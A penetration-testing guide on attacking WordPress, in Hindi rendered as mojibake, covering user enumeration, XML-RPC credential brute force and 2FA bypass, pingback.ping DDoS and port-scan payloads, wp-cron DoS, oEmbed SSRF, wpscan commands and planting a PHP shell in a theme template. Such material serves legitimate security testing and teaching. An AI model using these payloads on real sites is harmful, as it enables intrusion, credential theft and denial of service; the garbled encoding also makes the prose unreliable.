# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА

- **рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ** рдлрд╛рдЗрд▓реЗрдВ рдЬрд╛рддреА рд╣реИрдВ: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **рдереАрдо рдлрд╛рдЗрд▓реЗрдВ /wp-content/themes/ рдореЗрдВ рдорд┐рд▓рддреА рд╣реИрдВ,** рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк рдереАрдо рдХреЗ рдХреБрдЫ php рдХреЛ рдмрджрд▓рдХрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╢рд╛рдпрдж рдЙрд╕ рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: **theme twentytwelve** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **404.php** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **рдПрдХ рдФрд░ рдЙрдкрдпреЛрдЧреА url рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** рдореЗрдВ рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ root рдкрд╛рд╕рд╡рд░реНрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
- рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд▓реЙрдЧрд┐рди рдкрде: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **рдореБрдЦреНрдп WordPress рдлрд╛рдЗрд▓реЗрдВ**

- `index.php`
- `license.txt` рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХреА рдЧрдИ WordPress рдХрд╛ рд╕рдВрд╕реНрдХрд░рдгред
- `wp-activate.php` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдП WordPress рд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХреЗ рд╕рдордп рдИрдореЗрд▓ рд╕рдХреНрд░рд┐рдпрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИред
- рд▓реЙрдЧрд┐рди рдлрд╝реЛрд▓реНрдбрд░реНрд╕ (рдЫреБрдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдо рдмрджрд▓рд╛ рдЧрдпрд╛ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ WordPress рдХреА рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рджрд░реНрд╢рд╛рддреА рд╣реИ рдЬреЛ HTTP рдХреЛ рдЯреНрд░рд╛рдВрд╕рдкреЛрд░реНрдЯ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдФрд░ XML рдХреЛ рдПрдирдХреЛрдбрд┐рдВрдЧ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛ рд╕рдВрдЪрд╛рд░ рд╕рдХреНрд╖рдо рдХрд░рддреА рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рдВрдЪрд╛рд░ рдХреЛ WordPress рдХреЗ [REST API](https://developer.wordpress.org/rest-api/reference) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- `wp-content` рдлрд╝реЛрд▓реНрдбрд░ рдореБрдЦреНрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ plugins рдФрд░ themes рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред
- `wp-content/uploads/` рд╡рд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- `wp-includes/` рдпрд╣ рд╡рд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдХреЛрд░ рдлрд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ, рдлреЙрдиреНрдЯ, JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ, рдФрд░ рд╡рд┐рдЬреЗрдЯред
- `wp-sitemap.xml` WordPress рдХреЗ рд╕рдВрд╕реНрдХрд░рдг 5.5 рдФрд░ рдЙрд╕рд╕реЗ рдКрдкрд░ рдореЗрдВ, WordPress рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреЛрд╕реНрдЯ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд░ рдФрд░ рдЯреИрдХреНрд╕реЛрдиреЙрдореА рдХреЗ рд╕рд╛рде рдПрдХ sitemap XML рдлрд╝рд╛рдЗрд▓ рдЬреЗрдирд░реЗрдЯ рдХрд░рддрд╛ рд╣реИред

**Post exploitation**

- `wp-config.php` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ WordPress рдХреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ, рдЬреИрд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╛рдо, рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реЛрд╕реНрдЯ, username рдФрд░ password, authentication keys рдФрд░ salts, рдФрд░ рдбреЗрдЯрд╛рдмреЗрд╕ рдЯреЗрдмрд▓ рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕ред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ DEBUG рдореЛрдб рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ troubleshooting рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

- **Administrator**
- **Editor**: рдЕрдкрдиреЗ рдФрд░ рджреВрд╕рд░реЛрдВ рдХреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Author**: рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Contributor**: рдкреЛрд╕реНрдЯ рд▓рд┐рдЦрддрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рдкрд░ рдЙрдиреНрд╣реЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛
- **Subscriber**: рдкреЛрд╕реНрдЯ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдкрдиреА рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ

## **Passive Enumeration**

### **Get WordPress version**

Check if you can find the files `/license.txt` or `/readme.html`

Inside the **рд╕реНрд░реЛрдд рдХреЛрдб** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS рд▓рд┐рдВрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (533).png>)

- JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (524).png>)

### рдкреНрд▓рдЧрдЗрдиреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рдереАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд╕рдВрд╕реНрдХрд░рдг рдирд┐рдХрд╛рд▓реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## рд╕рдХреНрд░рд┐рдп рдЕрдиреБрдХреНрд░рдордг

### Plugins рдФрд░ Themes

рдЖрдк рд╕рдВрднрд╡рддрдГ рд╕рднреА Plugins рдФрд░ Themes рдЦреЛрдЬ рдкрд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **actively Brute Force a list of Plugins and Themes** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдЦреБрд╢рдХрд┐рд╕реНрдорддреА рд╕реЗ рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдРрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯреВрд▓реНрд╕ рдореМрдЬреВрдж рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдпреЗ рд╕реВрдЪрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ)ред

### Users

- **ID Brute:** Brute Forcing рджреНрд╡рд╛рд░рд╛ users IDs рдирд┐рдХрд╛рд▓ рдХрд░ рдЖрдк рдХрд┐рд╕реА WordPress рд╕рд╛рдЗрдЯ рдХреЗ рд╡реИрдз users рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ **200** рдпрд╛ **30X** рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ id **рдорд╛рдиреНрдп** рд╣реИред рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **400** рд╣реИ, рддреЛ id **рдЕрдорд╛рдиреНрдп** рд╣реИред

- **wp-json:** рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА рдХрд░рдХреЗ рднреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
рдПрдХ рдФрд░ `/wp-json/` endpoint рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **рдХреЗрд╡рд▓ рдЙрди users рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдпрд╣ feature рд╕рдХреНрд╖рдо рд╣реИред**

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: рдЬрдм **`/wp-login.php`** рдкрд░ рд▓реЙрдЧрд┐рди рдХрд░рддреЗ рд╕рдордп **message** **different** рд╣реЛрддрд╛ рд╣реИ тАФ рдпрд╣ рдЗрд╕ рдмрд╛рдд рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ **username exists or not**ред

### XML-RPC

рдпрджрд┐ `xml-rpc.php` рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЖрдк credentials brute-force рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп resources рдкрд░ DoS attacks рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред (рдЖрдк рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [using this](https://github.com/relarizky/wpxploit) рд╕реЗ automate рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**рдЬрд╛рдВрдЪреЗрдВ**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** рдпрд╛ **`metaWeblog.getUsersBlogs`** рдРрд╕реЗ рдХреБрдЫ methods рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ credentials рдХреЛ brute-force рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдкрд╛ рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
рд╕рдВрджреЗрд╢ _"Incorrect username or password"_ рдПрдХ 200 code response рдХреЗ рдЕрдВрджрд░ рддрдм рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм credentials рд╡реИрдз рдирд╣реАрдВ рд╣реИрдВред

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

рд╕рд╣реА credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ file рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред response рдореЗрдВ path рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA рдмрд╛рдпрдкрд╛рд╕**

рдпрд╣ рддрд░реАрдХрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдореНрд╕ рдХреЗ рд▓рд┐рдП рд╣реИ рди рдХрд┐ рдЗрдВрд╕рд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП, рдФрд░ рдкреБрд░рд╛рдирд╛ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рдпрд╣ 2FA рдХреЛ рд╕рдкреЛрд░реНрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡реИрдз рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╣реИрдВ рдкрд░ рдореБрдЦреНрдп рд▓реЙрдЧрд┐рди 2FA рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, **рдЖрдк xmlrpc.php рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реЗ 2FA рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдП рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдЖрдк рдХрдВрд╕реЛрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛ рд╕рднреА рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡реЗ рдпрд╣рд╛рдБ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрдВрдЧреА, рдкрд░ рдЖрдк рдлрд┐рд░ рднреА RCE рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ Ippsec рдиреЗ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рд╣реИ

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **рд╣рдЬрд╝рд╛рд░реЛрдВ** of Wordpress **рд╕рд╛рдЗрдЯреНрд╕** to **рдПрдХ рддрдХрд╛рдБрдЪ** (one **location**) рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд░рдиреЗ рдХреЛ рдХрд╣реЗрдВ (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** рдХреЛ **рд╕реНрдХреИрди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рдЖрдВрддрд░рд┐рдХ **рдиреЗрдЯрд╡рд░реНрдХ** рдХреЛ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдк рдХреЛрдИ рднреА рдкреЛрд░реНрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

рдпрджрд┐ рдЖрдкрдХреЛ **faultCode** рдХрд╛ рдорд╛рди **0** (17) рд╕реЗ **рдмрдбрд╝рд╛** рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИред

рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ **`system.multicall`** рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдпрд╣ рд╕реАрдЦ рд╕рдХреЗрдВ рдХрд┐ рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╕реЗ DDoS рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдЖрдорддреМрд░ рдкрд░ Wordpress рд╕рд╛рдЗрдЯ рдХреА рд░реВрдЯ рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИ: **`/wp-cron.php`**\
рдЬрдм рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **accessed** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ "**heavy**" MySQL **query** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **attackers** рджреНрд╡рд╛рд░рд╛ **cause** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **DoS**.\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `wp-cron.php` рдХреЛ рд╣рд░ рдкреЗрдЬ рд▓реЛрдб рдкрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬрдм рднреА рдХреЛрдИ client рдХрд┐рд╕реА рднреА Wordpress рдкреЗрдЬ рдХреЛ requests рдХрд░рддрд╛ рд╣реИ), рдЬреЛ high-traffic рд╕рд╛рдЗрдЯреНрд╕ рдкрд░ рд╕рдорд╕реНрдпрд╛рдПрдБ (DoS) рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ Wp-Cron рдХреЛ disable рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ host рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ cronjob рдмрдирд╛рдпрд╛ рдЬрд╛рдП рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рдХреНрд░рд┐рдпрд╛рдПрдБ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рдХрд░реЗ (рдмрд┐рдирд╛ рд╕рдорд╕реНрдпрд╛рдПрдБ рдкреИрджрд╛ рдХрд┐рдП).

### /wp-json/oembed/1.0/proxy - SSRF

рдЗрд╕ URL рдХреЛ access рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ рдФрд░ Worpress рд╕рд╛рдЗрдЯ рдЖрдкрдХреЗ рдкрд╛рд╕ request рдХрд░ рд╕рдХрддреА рд╣реИред

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

рдпрд╣ tool рдЬрд╛рдБрдЪрддрд╛ рд╣реИ рдХрд┐ **methodName: pingback.ping** рдФрд░ path **/wp-json/oembed/1.0/proxy** рдореМрдЬреВрдж рд╣реИ рдФрд░ рдпрджрд┐ рдореМрдЬреВрдж рд╣реЛ рддреЛ рдпрд╣ рдЙрдиреНрд╣реЗрдВ exploit рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

## рдСрдЯреЛрдореИрдЯреЗрдб рдЯреВрд▓реНрд╕
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## рдПрдХ bit рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдпрд╣ рдЕрд╕рд▓ рд╣рдорд▓реЗ рд╕реЗ рдЬреНрдпрд╛рджрд╛ рдПрдХ рдЬрд┐рдЬреНрдЮрд╛рд╕рд╛ рд╣реИред CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рднреА wordpress рдлрд╝рд╛рдЗрд▓ рдХрд╛ 1 bit рдкрд▓рдЯ рд╕рдХрддреЗ рдереЗред рддреЛ рдЖрдк рдлрд╛рдЗрд▓ `/var/www/html/wp-includes/user.php` рдХреА рд╕реНрдерд┐рддрд┐ `5389` рдХрд╛ bit рдкрд▓рдЯрдХрд░ NOT (`!`) рдСрдкрд░реЗрд╢рди рдХреЛ NOP рдХрд░ рд╕рдХрддреЗ рдереЗред
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **рдкреИрдирд▓ RCE**

**рдереАрдо рдореЗрдВ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдП рдЧрдП php рдореЗрдВ рд╕рдВрд╢реЛрдзрди (admin credentials needed)**

Appearance тЖТ Theme Editor тЖТ 404 Template (рджрд╛рдПрдБ рддрд░рдл)

php shell рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рдмрджрд▓реЗрдВ:

![](<../../images/image (384).png>)

